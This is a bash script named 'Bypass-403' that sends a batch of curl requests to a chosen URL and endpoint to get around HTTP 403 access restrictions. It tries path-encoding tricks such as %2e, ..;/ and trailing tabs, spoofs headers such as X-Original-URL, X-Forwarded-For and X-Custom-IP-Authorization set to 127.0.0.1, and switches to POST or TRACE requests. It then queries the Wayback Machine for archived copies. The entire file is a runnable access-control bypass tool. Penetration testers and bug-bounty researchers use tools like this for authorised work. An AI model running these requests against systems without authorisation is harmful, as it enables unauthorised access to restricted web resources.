#!/bin/bash

figlet Bypass-403
echo "                                                  Mod by KingBOB"
echo "Usage: bash bypass-403.sh <url> <endpoint>"
echo " "

send_request() {
    local url="$1"
    local options="$2"
    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $options "$url"
    echo "  --> ${url} ${options}"
}

# Base URL and endpoint from user input
BASE_URL=$1
ENDPOINT=$2

# Send requests with different bypass techniques
send_request "${BASE_URL}/${ENDPOINT}" ""
send_request "${BASE_URL}/%2e/${ENDPOINT}" ""
send_request "${BASE_URL}/${ENDPOINT}/." ""
send_request "${BASE_URL}//${ENDPOINT}//" ""
send_request "${BASE_URL}/./${ENDPOINT}/./" ""
send_request "${BASE_URL}/${ENDPOINT}" "-H \"X-Original-URL: ${ENDPOINT}\""
send_request "${BASE_URL}/${ENDPOINT}" "-H \"X-Custom-IP-Authorization: 127.0.0.1\""
send_request "${BASE_URL}/${ENDPOINT}" "-H \"X-Forwarded-For: http://127.0.0.1\""
send_request "${BASE_URL}/${ENDPOINT}" "-H \"X-Forwarded-For: 127.0.0.1:80\""
send_request "${BASE_URL}" "-H \"X-rewrite-url: ${ENDPOINT}\""
send_request "${BASE_URL}/${ENDPOINT}%20" ""
send_request "${BASE_URL}/${ENDPOINT}%09" ""
send_request "${BASE_URL}/${ENDPOINT}?" ""
send_request "${BASE_URL}/${ENDPOINT}.html" ""
send_request "${BASE_URL}/${ENDPOINT}/?anything" ""
send_request "${BASE_URL}/${ENDPOINT}#" ""
send_request "${BASE_URL}/${ENDPOINT}" "-H \"Content-Length:0\" -X POST"
send_request "${BASE_URL}/${ENDPOINT}/*" ""
send_request "${BASE_URL}/${ENDPOINT}.php" ""
send_request "${BASE_URL}/${ENDPOINT}.json" ""
send_request "${BASE_URL}/${ENDPOINT}" "-X TRACE"
send_request "${BASE_URL}/${ENDPOINT}" "-H \"X-Host: 127.0.0.1\""
send_request "${BASE_URL}/${ENDPOINT}..;/" ""
send_request "${BASE_URL}/${ENDPOINT};/" ""

echo "Way back machine:"
curl -s https://archive.org/wayback/available?url=${BASE_URL}/${ENDPOINT} | jq -r '.archived_snapshots.closest | {available, url}'
